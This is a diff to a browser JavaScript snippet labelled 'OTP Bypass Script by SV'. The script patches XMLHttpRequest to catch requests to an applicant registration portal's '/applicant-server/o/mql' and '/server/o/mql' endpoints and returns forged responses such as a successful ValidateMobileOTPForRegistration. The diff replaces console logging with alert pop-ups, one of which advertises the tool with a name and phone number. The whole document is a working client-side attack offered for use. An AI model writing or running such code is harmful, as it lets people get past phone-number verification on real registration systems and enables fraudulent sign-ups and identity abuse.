@@ -1,15 +1,13 @@
 (function () {
-  const LOG = console.log; // short alias for logs
+  const notify = (msg) => alert(msg); // Alert instead of console.log
 
-  LOG("🧪 OTP Bypass by SV");
+  notify("🧪 OTP Bypass Script Initialized by SV");
 
-  // 🎯 Define target endpoints
   const endpoints = [
     "/applicant-server/o/mql",
     "/server/o/mql",
   ];
 
-  // 📝 Fake responses for matching keys
   const fakeResponses = {
     ValidateMobileOTPForRegistration: () => ({
       ValidateMobileOTPForRegistration: {
@@ -57,7 +55,6 @@
     }),
   };
 
-  // 🔧 Save original XHR methods
   const originalOpen = XMLHttpRequest.prototype.open;
   const originalSend = XMLHttpRequest.prototype.send;
 
@@ -74,12 +71,13 @@
         );
 
         if (matchedKey) {
-          LOG(`✅ Intercepted ${matchedKey}`);
-
           const xhr = this;
           const fakeResponseText = JSON.stringify(fakeResponses[matchedKey]());
 
-          // Patch onreadystatechange
+          // ✅ Alert on successful OTP interception
+          notify(`✅ OTP Verified Successfully.\nThank you for using our tool.\nSV | Contact: 9921076909`);
+
+          // Patch onreadystatechange to inject fake response
           const originalOnReadyStateChange = xhr.onreadystatechange;
           xhr.onreadystatechange = function () {
             if (xhr.readyState === 4) {
@@ -88,7 +86,6 @@
                   get: () => fakeResponseText,
                 });
               } catch (e) {
-                LOG("⚠️ Fallback override failed:", e);
                 xhr.responseText = fakeResponseText;
               }
             }
@@ -99,7 +96,7 @@
         }
       }
     } catch (err) {
-      LOG("🚫 Bypass error:", err);
+      notify("🚫 Error during OTP bypass:\n" + err);
     }
 
     return originalSend.apply(this, arguments);
